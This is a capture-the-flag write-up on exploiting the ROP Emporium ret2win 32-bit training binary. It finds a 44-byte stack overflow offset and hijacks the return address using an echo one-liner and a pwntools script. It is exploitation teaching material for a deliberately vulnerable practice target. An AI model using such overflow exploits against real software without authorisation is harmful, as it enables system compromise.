---

title: ROP Emporium - ret2win - x86
date: '2024-07-21'
tags: ['pwn', 'ctf', 'Binary Exploitation', 'Ret2win','write-up']
draft: false
summary: Exploit a binary using ROP to call ret2win() and print the flag.

---

# Ret2win

A technique used to invoke an uninvoked function by binary exploitation using stack buffer overflow.

It is done when we have NX enabled on the code.

Let’s learn how we can exploit code using ret2win in C programming. We will explain this with the ROP Emporium challenge ret2win-32. Here is the binary file attached.

[ret2win32](https://prod-files-secure.s3.us-west-2.amazonaws.com/21a1fb05-e61b-4497-b1d6-bdf89d2923f4/72d25abf-6b03-49b9-ad9d-46f3ea534ac1/ret2win32.txt)

First check what file it is using `file` command.

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/image1.png)


Now check what protections are enabled on this binary. For ret2win, it is essential that NX is enabled.

```bash
checksec --file=ret2win32
```

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img2.png)

```bash
rabin2 -I ret2win32
#this will provide binary info
```

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img3.png)

```bash
rabin2 -i ret2win
# this will list all the imported functions and libraries
```

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img4.png)

```bash
rabin2 -qs ret2win | grep -ve imp -e ' 0 '
# this will give us the important functions of the binary
```

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img5.png)

```bash
rabin2 -z ret2win32
# this will give the important strings of the binary
```

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img6.png)

I opened the program to analyze it in Ghidra and examined the functions like main and pwnme. Then, I opened gdb and disassembled pwnme to figure out how it works. I ran the binary and input a lot of numbers; it gave a segmentation fault and returned to the ret address.

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img7.png)

To check out the offset where it returns, i did this:

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img8.png)

It means the offset at which program breaks is 0x4c4c4c which is `L` . It means after `K` it is overwriting the return address, which i can check out like this;

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img9.png)

This time it gave the hex 0x5a5a5a, which in ASCII is Z. So, we have figured out our offset to overwrite the return address. What we need to do next is to overwrite this address with the win address (in this case, it is the ret2win function address) which will print out our flag (just in this case; otherwise, in a real scenario, it will get the root address).

Now let’s count the length after which overflow is possible.

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img10.png)

So after 44 bytes we’ll be able to overwrite our ret address.

44 → offset value

Now to get the address of ret2win function, i’ll run this command on my local machine terminal

```bash
nm ./ret2win
```

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img11.png)

Here we go, got the address. Now it’s time to overwrite it. I gave the address in little-endian format in the form of raw bytes. For this, I used the command:

```bash
echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK\x2c\x86\x04\x08'
```
![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img12.png)

After this result, we thought we did something wrong. Nah, the trick is we are getting the flag, but because our program is closing, so is the file. So for this, there’ll be a bit of modification in the command, and it goes as:

```bash
(echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK\x2c\x86\x04\x08' ; cat ) | ./ret2win32
```

Why so? Why did we give the command like that? The answer is when we run the cat command, it prints out the same output on the terminal. So in order to print the flag (just in this case; otherwise, to get the shell in a real scenario), we want to run the echo command, then execute cat before the binary program closes so that we can get the shell or flag or whatever the case is. And voila, here we go, got our flag.

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img13.png)

Now we know how to overwrite the address, let’s write the exploit of this address in any editor in our terminal.

```bash
#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF('./ret2win32')
io = process()
payload = cyclic(44) + pack(elf.sym.ret2win)
io.sendline(payload)
io.interactive()

```

In this exploit, I created an elf variable in which I stored the binary of that file, making it accessible because of the pwn library. The payload first contains any garbage 44 bytes (as it was our offset value), then using the elf binary, we got the address of ret2win. pack is used to convert the address of the ret2win function to the 32-bit format (in this case, it is x86 or 32-bit ELF). Then we send the payload, and interactive is to make the binary interactive to display output on the terminal.

I ran this exploit.

```bash
./ret2win32_exploit.py
```

And here i got the result.

![Screenshot](/static/writeups/rop_emporiium/ret2win32/images/img14.png)

That's all for today.
**Happy Hacking!!!**